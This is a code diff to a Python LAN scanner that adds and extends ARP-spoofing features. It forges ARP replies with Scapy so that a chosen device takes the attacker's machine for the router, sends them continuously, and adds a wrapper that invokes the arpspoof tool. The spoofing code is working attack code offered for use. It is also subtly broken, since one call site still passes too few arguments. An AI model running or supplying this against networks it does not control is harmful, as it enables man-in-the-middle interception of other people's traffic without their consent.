@@ -32,7 +32,27 @@ except Exception:
 USE_SCAPY_ACTIVE_SCAN = False  # Keep False for fastest execution
 
 # --------- General utilities ---------
+def run_arpspoof(target_ip, spoof_ip):
+    """
+    Use arpspoof tool to perform ARP spoofing.
+    """
+    try:
+        subprocess.run(["arpspoof", "-i", "eth0", "-t", target_ip, spoof_ip], check=True)
+        print(f"arpspoof running on {target_ip} -> {spoof_ip}")
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to run arpspoof: {e}")
+        
 
+def is_router_ip(ip: str) -> bool:
+    """
+    تحقق مما إذا كان عنوان الـ IP يُعتبر راوتر شائعاً.
+    """
+    # قائمة بالعناوين الشائعة للراوتر
+    common_router_ips = ["192.168.1.1", "192.168.0.1"]
+    
+    return ip in common_router_ips
+
+        
 def run_cmd(cmd):
     """Run a command and return stdout as text."""
     result = subprocess.run(
@@ -62,27 +82,24 @@ def is_ip_online(ip: str) -> bool:
 
 def get_mac_from_arp_cache(ip: str) -> str:
     """
-    Use 'arp -a <ip>' to find MAC for a specific IP.
-    This is the "other function" that links IP -> MAC.
+    Use 'arp -a' to find MAC for a specific IP. Retry if not found initially.
     """
-    try:
+    max_attempts = 3
+    for attempt in range(max_attempts):
         output = run_cmd(["arp", "-a", ip])
-    except Exception:
-        return ""
-
-    mac_pattern = re.compile(
-        rf"{re.escape(ip)}\s+([0-9a-fA-F\-]+)\s+(dynamic|static|invalid)",
-        re.IGNORECASE,
-    )
-
-    for line in output.splitlines():
-        m = mac_pattern.search(line)
-        if m:
-            mac = m.group(1).lower()
-            if mac not in {"ff-ff-ff-ff-ff-ff", "00-00-00-00-00-00"}:
-                return mac
-
+        mac_pattern = re.compile(
+            rf"{re.escape(ip)}\s+([0-9a-fA-F\-]+)\s+(dynamic|static|invalid)",
+            re.IGNORECASE,
+        )
+        for line in output.splitlines():
+            m = mac_pattern.search(line)
+            if m:
+                mac = m.group(1).lower()
+                if mac not in {"ff-ff-ff-ff-ff-ff", "00-00-00-00-00-00"}:
+                    return mac
+        time.sleep(1)  # Wait before retrying
     return ""
+
 
 
 # --------- 1) Read ARP TABLE using arp -a ---------
@@ -235,39 +252,58 @@ def get_own_mac():
     return ":".join([mac_num[e:e+2] for e in range(0, 12, 2)])
 
 
-def perform_arp_spoof(target_ip, spoof_ip):
+def perform_arp_spoof(target_ip, spoof_ip, devices, count=10):
     """
-    Perform ARP spoofing on a target IP making it believe our machine is the spoof IP (like the router).
+    Perform ARP spoofing using the MAC address from the pre-scanned devices list.
+    
+    Args:
+        target_ip (str): IP address of the target device.
+        spoof_ip (str): IP address of the router to spoof.
+        devices (dict): A dictionary of previously scanned devices with IP and MAC addresses.
+        count (int): Number of ARP packets to send.
     """
-    target_mac = get_mac_from_arp_cache(target_ip)
+    target_mac = devices.get(target_ip, "").lower()
+    
     if not target_mac:
-        print(f"[Error] Could not find MAC for target {target_ip}. Make sure the device is online.")
+        print(f"[Error] Could not find MAC for target {target_ip}. Make sure the device is online and scanned.")
         return
 
-    # Use the local machine MAC address
     our_mac = get_own_mac()
 
     arp_response = ARP(
-        op=2,                 # ARP reply
-        pdst=target_ip,       # IP of the target
-        hwdst=target_mac,     # Actual MAC of the target
-        psrc=spoof_ip,        # IP we pretend to be (e.g., the router)
-        hwsrc=our_mac         # Our own MAC address
+        op=2,
+        pdst=target_ip,
+        hwdst=target_mac,
+        psrc=spoof_ip,
+        hwsrc=our_mac
     )
 
-    # Send the ARP response
-    send(arp_response, verbose=False)
-    print(f"ARP Spoofing sent from {spoof_ip} to {target_ip} using our MAC as the router's MAC.")
+    for _ in range(count):
+        send(arp_response, verbose=False)
+        time.sleep(1)  # Short delay between sends
+    print(f"ARP Spoofing sent {count} times from {spoof_ip} to {target_ip} using our MAC as the router's MAC.")
 
 
-def continuously_spoof(target_ip, spoof_ip, interval=2):
-    """Continuously send ARP spoofing packets every ``interval`` seconds."""
+
+
+def continuously_spoof(target_ip, spoof_ip, devices, interval=1):
+    """
+    Continuously send ARP spoofing packets every 'interval' seconds.
+
+    Args:
+        target_ip (str): IP address of the target device.
+        spoof_ip (str): IP address of the router to spoof.
+        devices (dict): A dictionary of previously scanned devices with IP and MAC addresses.
+        interval (int): Time in seconds between each spoofing packet.
+    """
     try:
         while True:
-            perform_arp_spoof(target_ip, spoof_ip)
+            perform_arp_spoof(target_ip, spoof_ip, devices)
             time.sleep(interval)
     except KeyboardInterrupt:
         print(f"{Colors.WARNING}\n[!] Stopping continuous ARP spoofing.{Colors.ENDC}")
+
+
 
 
 # --------- 4) Merge results ---------
@@ -477,7 +513,8 @@ def prompt_for_spoof(online_devices):
 
     if mode == "y":
         print(f"{Colors.WARNING}Starting continuous spoofing... Press CTRL+C to stop.{Colors.ENDC}")
-        continuously_spoof(target_ip, router_ip)
+        continuously_spoof(target_ip, router_ip, devices)
+        run_arpspoof(target_ip, router_ip)
     else:
         perform_arp_spoof(target_ip, router_ip)
 
